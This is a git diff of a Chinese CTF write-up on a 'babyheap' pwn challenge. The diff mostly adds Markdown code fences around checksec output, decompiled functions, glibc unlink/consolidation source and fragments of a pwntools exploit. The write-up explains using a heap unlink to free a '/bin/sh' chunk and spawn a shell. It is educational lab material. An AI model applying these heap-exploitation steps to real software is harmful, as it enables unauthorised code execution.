@@ -15,12 +15,14 @@ tags:
 
 1，检查保护
 
+```ruby
 	[*] '/home/chris/Pwn/babyheap'
 	    Arch:     amd64-64-little
 	    RELRO:    Full RELRO
 	    Stack:    Canary found
 	    NX:       NX enabled
 	    PIE:      No PIE (0x400000)
+```
 
 除了PIE，其他的全开。
 
@@ -28,6 +30,7 @@ tags:
 
 #### main 函数分析
 
+```C
 	void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 	{
 	  char *v3; // rdi
@@ -75,6 +78,7 @@ tags:
 	    }
 	  }
 	}
+```
 
 读入你输入的选项，然后执行对应的函数，有5个选项：
 
@@ -100,6 +104,8 @@ malloc次数最多10次，每次大小只能为 0x20（fastbin），所以常规
 
 每次edit会使dword_6020B0值+1.当dword_6020B0值为3时，不能进行edit。作用是限制只能进行三次edit,且edit的大小0x20，观察sub_40092b函数
 
+```C
+
 	unsigned __int64 __fastcall sub_40092B(__int64 a1, unsigned int a2)
 	{
 	  unsigned __int64 result; // rax
@@ -120,6 +126,8 @@ malloc次数最多10次，每次大小只能为 0x20（fastbin），所以常规
 	  }
 	  return result;
 	}
+
+```
 
 通过read逐字节读取，无溢出。
 
@@ -178,7 +186,7 @@ chunk 错了一下位 这是重中之重 unlink向前合并利用的关键
 
 首先检测next chunk是否为free。那么如何检测呢？很简单，查询next chunk之后的chunk的 PREV_INUSE (P)即可。相关代码如下：
 
-	#!c
+```c
 	……
 	/*这里p指向当前chunk*/
 	nextchunk = chunk_at_offset(p, size);
@@ -197,6 +205,7 @@ chunk 错了一下位 这是重中之重 unlink向前合并利用的关键
 	
 	      ……
 	    }
+```
 
 整个操作与”向后合并“操作类似，再通过上述代码结合注释应该很容易理解free chunk的向前结合操作。在本例中当前chunk为first，它的下一个chunk为second，再下一个chunk为top chunk，此时 top chunk的 `PREV_INUSE`位是设置为1的(表示top chunk的前一个chunk，即second chunk, 已经使用)，因此first的下一个chunk不会被“向前合并“掉。
 
@@ -222,6 +231,7 @@ bingo 最后就很简单了，分配一个新chunk 内容为 '/bin/sh\x00',并fr
 
 ## 0x02 完整脚本
 
+```python
 	from pwn import *
 	context(os='linux', arch='amd64', log_level='debug')
 	p=process("./babyheap")
@@ -297,6 +307,7 @@ bingo 最后就很简单了，分配一个新chunk 内容为 '/bin/sh\x00',并fr
 	Delete(8)
 	
 	p.interactive()
+```
 
 ## 0x03 总结
 
